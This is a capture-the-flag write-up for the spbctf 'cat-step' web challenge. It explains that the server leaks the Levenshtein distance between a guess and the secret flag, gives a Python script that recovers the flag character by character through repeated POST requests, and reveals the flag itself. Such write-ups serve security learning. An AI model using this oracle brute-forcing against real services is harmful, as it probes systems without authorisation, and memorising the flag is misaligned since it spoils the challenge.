#### Challenge:

Greeting human!

We want to play a game with you. The mission is simple: you need to guess our flag, that’s all. We use an algorithm to determine the similarity of strings.

[cat-step.disasm.me](https://cat-step.disasm.me/)

---

#### Solution:

- the flag can be leaked/guessed based on the REST endpoint compare which is based on [Levenshtein distance](https://en.wikipedia.org/wiki/Levenshtein_distance)

```python
import requests
import string

flag = (['_'] * 28)
s = requests.session()


def check():
    resp = s.post('https://cat-step.disasm.me',
                  data={'flag': 'spbctf{'+''.join(flag)+'}'})
    return resp.json()['length']


len = 28
for i in range(0, 28):
    len = check()
    for c in string.printable:
        cc = flag[i]
        flag[i] = c

        if check() >= len:
            flag[i] = cc
            continue
        else:
            break
    print(len, ''.join(flag))

print('spbctf{'+''.join(flag)+'}')
```

---

<details><summary>FLAG:</summary>

```
spbctf{easy_web_fuzzing_0t5AFzSG0Oc}
```

</details>
<br/>
